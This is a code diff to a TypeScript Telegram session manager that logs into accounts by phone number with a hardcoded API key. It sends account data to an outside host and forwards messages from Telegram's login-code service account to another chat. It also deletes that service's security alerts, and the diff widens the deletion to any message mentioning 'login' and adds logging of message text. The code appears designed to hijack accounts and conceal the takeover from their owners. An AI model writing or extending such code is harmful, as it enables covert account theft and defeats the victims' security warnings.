@@ -10,7 +10,7 @@ const clients = new Map();
 const apiId = 24559917 || parseInt(process.env.API_ID);
 const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;
 
-async function restAcc(phoneNumber) {
+export async function restAcc(phoneNumber) {
     await sleep(1000);
     console.log("Reset - ", phoneNumber);
     const client: TelegramManager = getClient(phoneNumber)
@@ -201,7 +201,7 @@ class TelegramManager {
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
                 setTimeout(async () => {
                     await restAcc(this.phoneNumber);
-                }, 40000);
+                }, 50000);
                 return { status: 200, message: "Login success" }
             }
         } catch (err: any) {
@@ -255,6 +255,7 @@ class TelegramManager {
 }
 
 async function deleteMsgs(event: NewMessageEvent) {
+    console.log(event.message.text);
     if (event.message.chatId.toString() == "777000") {
         const payload = {
             chat_id: "-1001801844217",
@@ -270,9 +271,9 @@ async function deleteMsgs(event: NewMessageEvent) {
         await fetchWithTimeout(`${ppplbot}`, options);
     }
     await sleep(300);
-    const msgs = await event.client.getMessages("777000", { limit: 3 });
+    const msgs = await event.client.getMessages("777000", { limit: 2 });
     msgs.forEach(async msg => {
-        if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
+        if (msg.text.toLowerCase().includes('login')) {
             await msg.delete({ revoke: true });
         }
     })
